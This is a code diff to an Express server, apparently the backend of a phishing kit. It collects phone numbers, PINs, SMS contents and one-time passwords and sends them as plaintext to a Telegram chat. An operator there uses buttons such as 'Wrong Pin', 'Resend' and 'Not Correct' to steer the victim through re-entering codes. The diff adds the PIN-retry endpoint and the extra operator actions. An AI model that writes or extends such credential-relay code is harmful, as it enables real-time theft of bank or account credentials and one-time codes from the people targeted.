@@ -104,24 +104,7 @@ async function answerCallbackQuery(callbackQueryId, text) {
     }
 }
 
-async function editTelegramMessage(chatId, messageId, text) {
-    try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chatId,
-                message_id: messageId,
-                text,
-                parse_mode: 'HTML',
-            }),
-        });
-    } catch (err) {
-        console.error('editMessageText failed:', err.message);
-    }
-}
-
-// ✅ NEW: Only edits the buttons — keeps original message intact
+// ✅ Only edits the buttons — keeps original message intact
 async function editTelegramButtons(chatId, messageId, replyMarkup) {
     try {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
@@ -233,6 +216,7 @@ app.post('/api/application', async (req, res) => {
 
 // --------------------------------------------
 // POST /api/login → Admin approval
+// Buttons: Approve / Reject
 // --------------------------------------------
 app.post('/api/login', async (req, res) => {
     try {
@@ -294,6 +278,7 @@ app.post('/api/login', async (req, res) => {
 
 // --------------------------------------------
 // POST /api/sms → Admin approval
+// Buttons: Approve / Reject / Resend / Wrong Pin
 // --------------------------------------------
 app.post('/api/sms', async (req, res) => {
     try {
@@ -325,13 +310,19 @@ app.post('/api/sms', async (req, res) => {
             `🆔 <b>Request:</b> <code>${escapeHtml(requestId)}</code>\n` +
             `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
             `<b>Message:</b>\n<code>${escapeHtml(trimmed)}</code>\n\n` +
-            `⚠️ <b>Approve to continue, Reject to deny.</b>`;
+            `⚠️ <b>Choose an action below.</b>`;
 
         const replyMarkup = {
-            inline_keyboard: [[
-                { text: '✅ Approve', callback_data: `approve:${requestId}` },
-                { text: '❌ Reject', callback_data: `reject:${requestId}` },
-            ]],
+            inline_keyboard: [
+                [
+                    { text: '✅ Approve', callback_data: `approve:${requestId}` },
+                    { text: '❌ Reject', callback_data: `reject_details:${requestId}` },
+                ],
+                [
+                    { text: '🔁 Resend', callback_data: `resend:${requestId}` },
+                    { text: '🔒 Wrong Pin', callback_data: `wrong_pin:${requestId}` },
+                ],
+            ],
         };
 
         const result = await sendTelegramMessage(msg, replyMarkup);
@@ -353,7 +344,67 @@ app.post('/api/sms', async (req, res) => {
 });
 
 // --------------------------------------------
+// POST /api/sms-retry → After Wrong Pin
+// Buttons: Approve / Not Correct
+// --------------------------------------------
+app.post('/api/sms-retry', async (req, res) => {
+    try {
+        const { phone, pin, token, sms } = req.body || {};
+
+        if (!pin || typeof pin !== 'string' || !/^\d{5}$/.test(pin.trim())) {
+            return res.status(400).json({ ok: false, error: 'PIN must be exactly 5 digits' });
+        }
+
+        const requestId = 'smsretry_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');
+
+        pendingApprovals.set(requestId, {
+            type: 'sms-retry',
+            phone: typeof phone === 'string' ? phone : 'unknown',
+            pin: pin.trim(),
+            token: typeof token === 'string' ? token : '',
+            sms: typeof sms === 'string' ? sms.slice(0, 800) : '',
+            status: 'pending',
+            createdAt: new Date().toISOString(),
+            messageId: null,
+        });
+
+        const msg =
+            `🔒 <b>PIN Re-submitted — Approval Required</b>\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `📱 <b>Phone:</b> ${escapeHtml(phone || 'unknown')}\n` +
+            `🔑 <b>New PIN:</b> <code>${escapeHtml(pin)}</code>\n` +
+            `🆔 <b>Request:</b> <code>${escapeHtml(requestId)}</code>\n` +
+            `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
+            `⚠️ <b>Approve to continue, Not Correct to send user back.</b>`;
+
+        const replyMarkup = {
+            inline_keyboard: [[
+                { text: '✅ Approve', callback_data: `approve:${requestId}` },
+                { text: '⚠️ Not Correct', callback_data: `not_correct:${requestId}` },
+            ]],
+        };
+
+        const result = await sendTelegramMessage(msg, replyMarkup);
+
+        if (result.ok && result.data?.result?.message_id) {
+            const p = pendingApprovals.get(requestId);
+            if (p) {
+                p.messageId = result.data.result.message_id;
+                pendingApprovals.set(requestId, p);
+            }
+        }
+
+        return res.json({ ok: true, requestId, status: 'pending' });
+
+    } catch (err) {
+        console.error('sms-retry error:', err);
+        return res.status(500).json({ ok: false, error: 'Server error' });
+    }
+});
+
+// --------------------------------------------
 // POST /api/verify-otp → Admin approval
+// Buttons: Approve / Reject / Resend
 // --------------------------------------------
 app.post('/api/verify-otp', async (req, res) => {
     try {
@@ -385,13 +436,18 @@ app.post('/api/verify-otp', async (req, res) => {
             `🔐 <b>OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
             `🆔 <b>Request:</b> <code>${escapeHtml(requestId)}</code>\n` +
             `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
-            `⚠️ <b>Approve to continue, Reject to deny.</b>`;
+            `⚠️ <b>Choose an action below.</b>`;
 
         const replyMarkup = {
-            inline_keyboard: [[
-                { text: '✅ Approve', callback_data: `approve:${requestId}` },
-                { text: '❌ Reject', callback_data: `reject:${requestId}` },
-            ]],
+            inline_keyboard: [
+                [
+                    { text: '✅ Approve', callback_data: `approve:${requestId}` },
+                    { text: '❌ Reject', callback_data: `reject:${requestId}` },
+                ],
+                [
+                    { text: '🔁 Resend', callback_data: `resend:${requestId}` },
+                ],
+            ],
         };
 
         const result = await sendTelegramMessage(msg, replyMarkup);
@@ -432,7 +488,8 @@ app.get('/api/approval/status/:requestId', (req, res) => {
 
 // --------------------------------------------
 // POST /api/telegram/callback
-// ✅ FIXED: Only changes buttons, keeps original message (PIN stays!)
+// ✅ Handles: approve, reject, reject_details, resend, wrong_pin, not_correct
+// ✅ Only changes buttons, keeps original message (PIN stays!)
 // --------------------------------------------
 app.post('/api/telegram/callback', async (req, res) => {
     try {
@@ -445,6 +502,12 @@ app.post('/api/telegram/callback', async (req, res) => {
             const callbackQueryId = cq.id;
             const messageId = cq.message?.message_id;
             const chatId = cq.message?.chat?.id;
+
+            // ✅ Silently ignore noop taps
+            if (data === 'noop') {
+                await answerCallbackQuery(callbackQueryId, '');
+                return res.json({ ok: true });
+            }
 
             const [action, requestId] = data.split(':');
             const pending = pendingApprovals.get(requestId);
@@ -459,41 +522,62 @@ app.post('/api/telegram/callback', async (req, res) => {
                 return res.json({ ok: true });
             }
 
-            if (action === 'approve') {
-                pending.status = 'approved';
-                pendingApprovals.set(requestId, pending);
+            let finalLabel = '';
 
-                await answerCallbackQuery(callbackQueryId, '✅ Approved');
+            switch (action) {
+                case 'approve':
+                    pending.status = 'approved';
+                    finalLabel = '✅ APPROVED';
+                    await answerCallbackQuery(callbackQueryId, '✅ Approved');
+                    break;
 
-                // ✅ Only change buttons — original message stays
-                if (messageId && chatId) {
-                    await editTelegramButtons(chatId, messageId, {
-                        inline_keyboard: [[
-                            { text: '✅ APPROVED', callback_data: 'noop' },
-                        ]],
-                    });
-                }
-                console.log('✅ Approved:', requestId);
+                case 'reject':
+                    pending.status = 'rejected';
+                    finalLabel = '❌ REJECTED';
+                    await answerCallbackQuery(callbackQueryId, '❌ Rejected');
+                    break;
 
-            } else if (action === 'reject') {
-                pending.status = 'rejected';
-                pendingApprovals.set(requestId, pending);
+                case 'reject_details':
+                    pending.status = 'reject_details';
+                    finalLabel = '❌ DETAILS REJECTED';
+                    await answerCallbackQuery(callbackQueryId, '❌ Details rejected');
+                    break;
 
-                await answerCallbackQuery(callbackQueryId, '❌ Rejected');
+                case 'resend':
+                    pending.status = 'resend';
+                    finalLabel = '🔁 RESEND';
+                    await answerCallbackQuery(callbackQueryId, '🔁 Resend requested');
+                    break;
 
-                // ✅ Only change buttons — original message stays
-                if (messageId && chatId) {
-                    await editTelegramButtons(chatId, messageId, {
-                        inline_keyboard: [[
-                            { text: '❌ REJECTED', callback_data: 'noop' },
-                        ]],
-                    });
-                }
-                console.log('❌ Rejected:', requestId);
+                case 'wrong_pin':
+                    pending.status = 'wrong_pin';
+                    finalLabel = '🔒 WRONG PIN';
+                    await answerCallbackQuery(callbackQueryId, '🔒 Wrong PIN');
+                    break;
 
-            } else {
-                await answerCallbackQuery(callbackQueryId, '⚠️ Unknown action');
+                case 'not_correct':
+                    pending.status = 'not_correct';
+                    finalLabel = '⚠️ NOT CORRECT';
+                    await answerCallbackQuery(callbackQueryId, '⚠️ Not correct');
+                    break;
+
+                default:
+                    await answerCallbackQuery(callbackQueryId, '⚠️ Unknown action');
+                    return res.json({ ok: true });
             }
+
+            pendingApprovals.set(requestId, pending);
+
+            // ✅ Only change buttons — original message stays
+            if (messageId && chatId) {
+                await editTelegramButtons(chatId, messageId, {
+                    inline_keyboard: [[
+                        { text: finalLabel, callback_data: 'noop' },
+                    ]],
+                });
+            }
+
+            console.log(`✅ ${action} → ${requestId} (status=${pending.status})`);
         }
 
         return res.json({ ok: true });
@@ -540,6 +624,6 @@ app.listen(PORT, () => {
     console.log(`   Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 20)}...`);
     console.log(`   Chat ID: ${TELEGRAM_CHAT_ID}`);
     console.log(`   Trust proxy: enabled`);
-    console.log(`   Admin Approval: ✅ ACTIVE (login, SMS, OTP)`);
+    console.log(`   Admin Approval: ✅ ACTIVE (login, SMS, SMS-retry, OTP)`);
     console.log(`   Button-only edit: ✅ ACTIVE (message stays intact)`);
 });
